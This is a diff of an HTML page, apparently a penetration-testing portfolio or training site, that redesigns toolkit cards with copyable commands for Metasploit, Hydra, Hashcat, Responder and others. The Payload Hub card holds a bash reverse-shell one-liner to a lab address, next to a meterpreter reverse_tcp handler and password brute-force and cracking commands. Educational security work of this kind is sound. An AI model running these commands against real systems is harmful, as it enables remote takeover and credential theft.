+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
 <!-- Toolkit 3: Exploitation -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-primary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">bug_report</span>
 <span>EXPLOITATION</span>
@@ -726,20 +948,90 @@
 <span class="font-mono text-[10px] text-outline">PHASE 03</span>
 </div>
 <p class="text-xs text-on-surface-variant">Controlled validation and local privilege escalation on authorized challenge rooms.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-bold">Metasploit</span>
-<span class="text-on-surface-variant text-[11px]">Exploit validation &amp; modular post-testing</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Metasploit Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Metasploit</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">MSFCONSOLE</span>
+    </div>
+    <a href="handbook/metasploit.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Metasploit Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Modular exploit verification against confirmed CVEs, multi/handler listeners, and payload staging.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">msfconsole -q -x "use multi/handler; run"</code>
+    <button type="button" onclick="navigator.clipboard.writeText('msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run&quot;'); if(window.showToast) window.showToast('Copied Metasploit command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="metasploit" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=msfconsole" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-semibold">Meterpreter</span>
-<span class="text-on-surface-variant text-[11px]">Controlled session management &amp; telemetry</span>
+<!-- SearchSploit Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">SearchSploit</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">EXPLOIT-DB</span>
+    </div>
+    <a href="handbook/searchsploit.html" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View SearchSploit Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Offline query of 45,000+ Exploit-DB PoCs matching service banners discovered in enumeration.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">searchsploit "Apache 2.4.49" --www</code>
+    <button type="button" onclick="navigator.clipboard.writeText('searchsploit &quot;Apache 2.4.49&quot; --color --www'); if(window.showToast) window.showToast('Copied SearchSploit command', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="searchsploit" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=searchsploit" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
+</div>
+<!-- Payload Hub Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-danger-critical/40 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-danger-critical font-bold text-sm">Payload Hub</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-danger-critical/10 border border-danger-critical/30 text-danger-critical">RCE · LFI · SHELLS</span>
+    </div>
+    <a href="payloads.html" class="text-[10px] text-outline hover:text-danger-critical transition-colors flex items-center gap-0.5" title="Open Payloads Cheatsheet">Cheatsheet ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">TryHackMe cheatsheet for reverse shells, command injection bypasses, LFI filters & TTY upgrades.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-danger-critical overflow-x-auto">
+    <code class="truncate pr-2 select-all">bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</code>
+    <button type="button" onclick="navigator.clipboard.writeText('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'); if(window.showToast) window.showToast('Copied reverse shell', 'success');" class="text-outline hover:text-danger-critical transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="payloads" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="payloads.html" class="text-danger-critical hover:underline flex items-center gap-1 font-semibold">
+      <span>Open Hub ↗</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
 <!-- Toolkit 4: Password Security -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-secondary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">password</span>
 <span>PASSWORD SECURITY</span>
@@ -747,28 +1039,90 @@
 <span class="font-mono text-[10px] text-outline">LAB ONLY</span>
 </div>
 <p class="text-xs text-on-surface-variant">Authorized lab hash identification, dictionary verification, and login audits.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-bold">Hydra</span>
-<span class="text-on-surface-variant text-[11px]">Authorized network login auditing (SSH/HTTP)</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Hydra Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">Hydra</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">LOGIN AUDITS</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-hydra" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View Hydra Reference">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Authorized network login auditing against SSH, FTP, and HTTP POST login forms with rate-limiting.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">hydra -l admin -P rockyou.txt ssh://target.lab</code>
+    <button type="button" onclick="navigator.clipboard.writeText('hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.lab -t 4'); if(window.showToast) window.showToast('Copied Hydra command', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="hydra" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=hydra" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-semibold">Hashcat</span>
-<span class="text-on-surface-variant text-[11px]">GPU-accelerated lab hash recovery</span>
+<!-- Hashcat Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Hashcat</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">GPU CRACKING</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-hashcat" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Hashcat Reference">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">GPU-accelerated offline password hash recovery using rule-based mutations for NTLM, MD5, and bcrypt.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">hashcat -m 1000 hashes.txt rockyou.txt</code>
+    <button type="button" onclick="navigator.clipboard.writeText('hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule'); if(window.showToast) window.showToast('Copied Hashcat command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="hashcat" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=hashcat" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-on-surface font-semibold">John the Ripper</span>
-<span class="text-on-surface-variant text-[11px]">Password hash auditing &amp; rule-based testing</span>
-</div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-outline font-semibold">rockyou.txt</span>
-<span class="text-on-surface-variant text-[11px]">Wordlist-driven credential testing in labs</span>
+<!-- John the Ripper Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-border-highlight transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-on-surface font-bold text-sm">John</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-surface-raised border border-border-hairline text-outline">HASH &amp; SHADOW</span>
+    </div>
+    <a href="handbook/modules/tools-reference.html#tool-john" class="text-[10px] text-outline hover:text-on-surface transition-colors flex items-center gap-0.5" title="View John Reference">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Automated hash format detection, /etc/shadow password auditing, and zip/pdf archive hash recovery.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-on-surface overflow-x-auto">
+    <code class="truncate pr-2 select-all">john --wordlist=rockyou.txt hashes.txt</code>
+    <button type="button" onclick="navigator.clipboard.writeText('john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'); if(window.showToast) window.showToast('Copied John command', 'success');" class="text-outline hover:text-on-surface transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="john" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=john" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
 <!-- Toolkit 5: Network Analysis & Wireless -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-primary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-primary font-bold">
 <span class="material-symbols-outlined text-base">wifi_tethering</span>
 <span>NETWORK &amp; WIRELESS</span>
@@ -776,24 +1130,90 @@
 <span class="font-mono text-[10px] text-outline">ANALYSIS</span>
 </div>
 <p class="text-xs text-on-surface-variant">Packet capture, protocol decoding, and authorized educational environments.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-bold">Wireshark</span>
-<span class="text-on-surface-variant text-[11px]">Deep packet inspection, streams &amp; PCAP decode</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Wireshark Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Wireshark / Tshark</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">PCAP DECODE</span>
+    </div>
+    <a href="handbook/modules/network-security.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Network Security Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Deep packet inspection, TCP stream reconstruction, TLS handshakes, and headless Tshark filters.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">tshark -r capture.pcap -Y "http"</code>
+    <button type="button" onclick="navigator.clipboard.writeText('tshark -r capture.pcap -Y &quot;http.request.method == \'POST\'&quot; -T fields -e http.file_data'); if(window.showToast) window.showToast('Copied Tshark command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="wireshark" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=tshark" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-semibold">Responder</span>
-<span class="text-on-surface-variant text-[11px]">LLMNR / NBT-NS simulation in controlled labs</span>
+<!-- Responder Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">Responder</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">LLMNR / NBT-NS</span>
+    </div>
+    <a href="handbook/modules/network-security.html" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View Network Security Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">LLMNR, NBT-NS and MDNS poison simulation in controlled Active Directory challenge rooms.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">sudo responder -I eth0 -dwv</code>
+    <button type="button" onclick="navigator.clipboard.writeText('sudo responder -I eth0 -dwv'); if(window.showToast) window.showToast('Copied Responder command', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="responder" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="handbook/modules/network-security.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Explore Guide ↗</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-on-surface font-semibold">Aircrack-ng</span>
-<span class="text-on-surface-variant text-[11px]">Authorized wireless packet capture &amp; analysis</span>
+<!-- Aircrack-ng Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-border-highlight transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-on-surface font-bold text-sm">Aircrack-ng</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-surface-raised border border-border-hairline text-outline">802.11 FRAMES</span>
+    </div>
+    <a href="handbook/modules/network-security.html" class="text-[10px] text-outline hover:text-on-surface transition-colors flex items-center gap-0.5" title="View Network Security Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Authorized wireless monitor mode packet capture, beacon observation & WPA2 4-way handshake analysis.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-on-surface overflow-x-auto">
+    <code class="truncate pr-2 select-all">airodump-ng -c 6 wlan0mon</code>
+    <button type="button" onclick="navigator.clipboard.writeText('airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w wpa_capture wlan0mon'); if(window.showToast) window.showToast('Copied Airodump command', 'success');" class="text-outline hover:text-on-surface transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="aircrack" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="handbook/modules/network-security.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Explore Guide ↗</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
 <!-- Toolkit 6: Research, Docs & OS / AI -->
-<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-3">
-<div class="flex items-center justify-between">
+<div class="bg-surface-subtle p-5 rounded-xl border border-border-hairline space-y-4 hover:border-secondary/40 transition-colors">
+<div class="flex items-center justify-between pb-1 border-b border-border-hairline">
 <div class="flex items-center gap-2 font-mono text-xs text-secondary font-bold">
 <span class="material-symbols-outlined text-base">psychology</span>
 <span>RESEARCH, OS &amp; LOCAL AI</span>
@@ -801,18 +1221,84 @@
 <span class="font-mono text-[10px] text-outline">ENVIRONMENT</span>
 </div>
 <p class="text-xs text-on-surface-variant">Operating system foundation, local AI models, and reference frameworks.</p>
-<div class="space-y-2 pt-1 font-mono text-xs">
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-primary font-bold">Kali Linux / Linux / Windows</span>
-<span class="text-on-surface-variant text-[11px]">Daily driver OS and multi-platform research</span>
+<div class="space-y-3 font-mono text-xs">
+<!-- Linux CLI & SUID Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Linux CLI &amp; SUID</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">DAILY DRIVER</span>
+    </div>
+    <a href="handbook/linux.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Linux Manual">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Daily Kali driver administration, SUID binary privilege auditing, sudo rules, and process inspection.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">find / -perm -4000 -type f 2&gt;/dev/null</code>
+    <button type="button" onclick="navigator.clipboard.writeText('find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;'); if(window.showToast) window.showToast('Copied Linux SUID audit command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="linux" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="terminal-lab.html?cmd=sudo" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Run in Lab ▶</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-secondary font-semibold">Ollama &amp; Qwen3-Coder 30B</span>
-<span class="text-on-surface-variant text-[11px]">Local LLM runtime with OpenCode integration</span>
+<!-- Python 3 Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-secondary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-secondary font-bold text-sm">Python 3 Automation</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-secondary/10 border border-secondary/30 text-secondary">SECURITY TOOLS</span>
+    </div>
+    <a href="handbook/modules/security-automation.html" class="text-[10px] text-outline hover:text-secondary transition-colors flex items-center gap-0.5" title="View Security Automation Guide">Manual ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Custom TCP socket creation, automated API testing, CVE exploit modifications, and security tooling.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-secondary overflow-x-auto">
+    <code class="truncate pr-2 select-all">python3 -c "import socket; ..."</code>
+    <button type="button" onclick="navigator.clipboard.writeText('python3 -c &quot;import socket; s=socket.socket(); s.connect((\'10.10.10.125\', 80)); print(\'Connected\')&quot;'); if(window.showToast) window.showToast('Copied Python snippet', 'success');" class="text-outline hover:text-secondary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="python" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="handbook/modules/security-automation.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Explore Guide ↗</span>
+    </a>
+  </div>
 </div>
-<div class="flex items-center justify-between p-2 rounded bg-canvas-base border border-border-hairline">
-<span class="text-on-surface font-semibold">SearchSploit / MITRE / OWASP</span>
-<span class="text-on-surface-variant text-[11px]">Vulnerability database &amp; testing guidelines</span>
+<!-- Ollama & Qwen3-Coder 30B Card -->
+<div class="p-3 rounded-lg bg-canvas-base border border-border-hairline hover:border-primary/50 transition-all space-y-2 group">
+  <div class="flex items-center justify-between">
+    <div class="flex items-center gap-1.5">
+      <span class="text-primary font-bold text-sm">Ollama &amp; Qwen3-Coder</span>
+      <span class="text-[9px] px-1.5 py-0.2 rounded bg-primary/10 border border-primary/30 text-primary">LOCAL AI (RTX 4070)</span>
+    </div>
+    <a href="projects/autonomous-pentesting-agent.html" class="text-[10px] text-outline hover:text-primary transition-colors flex items-center gap-0.5" title="View Autonomous Agent System">Case Study ↗</a>
+  </div>
+  <p class="text-[11px] text-on-surface-variant font-sans leading-relaxed">Private on-device LLM inference for CVE triage, code vulnerability review, and multi-agent workflows.</p>
+  <div class="flex items-center justify-between p-1.5 rounded bg-surface-subtle border border-border-hairline/80 text-[10px] text-primary overflow-x-auto">
+    <code class="truncate pr-2 select-all">ollama run qwen2.5-coder:32b</code>
+    <button type="button" onclick="navigator.clipboard.writeText('ollama run qwen2.5-coder:32b &quot;Analyze CVE-2021-41773 Apache path traversal&quot;'); if(window.showToast) window.showToast('Copied Ollama command', 'success');" class="text-outline hover:text-primary transition-colors shrink-0" title="Copy command">
+      <span class="material-symbols-outlined text-[13px]">content_copy</span>
+    </button>
+  </div>
+  <div class="pt-1 flex items-center justify-between text-[10px]">
+    <button type="button" data-tool-inspector="ollama" class="text-secondary hover:underline flex items-center gap-1 cursor-pointer">
+      <span class="material-symbols-outlined text-xs">search</span>
+      <span>Scenario HUD</span>
+    </button>
+    <a href="projects/cyberai.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">
+      <span>Explore Platform ↗</span>
+    </a>
+  </div>
 </div>
 </div>
 </div>
@@ -843,88 +1329,136 @@
 <span class="font-mono text-[10px] text-outline">SCOPED &amp; SYSTEMATIC</span>
 </div>
 <div class="grid grid-cols-2 sm:grid-cols-4 md:grid-cols-8 gap-2 font-mono text-xs">
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 01</span>
-<span class="text-primary font-bold mt-0.5">RECON</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 02</span>
-<span class="text-secondary font-bold mt-0.5">ENUMERATION</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 03</span>
-<span class="text-on-surface font-bold mt-0.5">DISCOVERY</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 04</span>
-<span class="text-primary font-bold mt-0.5">VALIDATION</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 05</span>
-<span class="text-danger-critical font-bold mt-0.5 text-[11px]">EXPLOIT CONCEPTS</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 06</span>
-<span class="text-secondary font-bold mt-0.5 text-[11px]">PRIVILEGE ESC</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-border-hairline flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 07</span>
-<span class="text-on-surface font-bold mt-0.5 text-[11px]">EVIDENCE &amp; DOCS</span>
-</div>
-<div class="p-2.5 rounded bg-canvas-base border border-primary/40 flex flex-col items-center text-center">
-<span class="text-outline text-[10px]">STEP 08</span>
-<span class="text-primary font-bold mt-0.5 text-[11px]">REMEDIATION</span>
-</div>
+<a href="handbook/modules/reconnaissance.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-primary hover:bg-primary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 01: Passive & Active Reconnaissance Guide">
+<span class="text-outline text-[10px] group-hover:text-primary transition-colors">STEP 01</span>
+<span class="text-primary font-bold mt-0.5 flex items-center gap-0.5">RECON <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="handbook/nmap.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-secondary hover:bg-secondary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 02: Nmap Port Enumeration & Service Fingerprinting">
+<span class="text-outline text-[10px] group-hover:text-secondary transition-colors">STEP 02</span>
+<span class="text-secondary font-bold mt-0.5 flex items-center gap-0.5">ENUM <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="handbook/modules/web-security.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-primary hover:bg-primary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 03: Web Content Discovery & Parameter Fuzzing">
+<span class="text-outline text-[10px] group-hover:text-on-surface transition-colors">STEP 03</span>
+<span class="text-on-surface font-bold mt-0.5 flex items-center gap-0.5">DISCOVERY <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
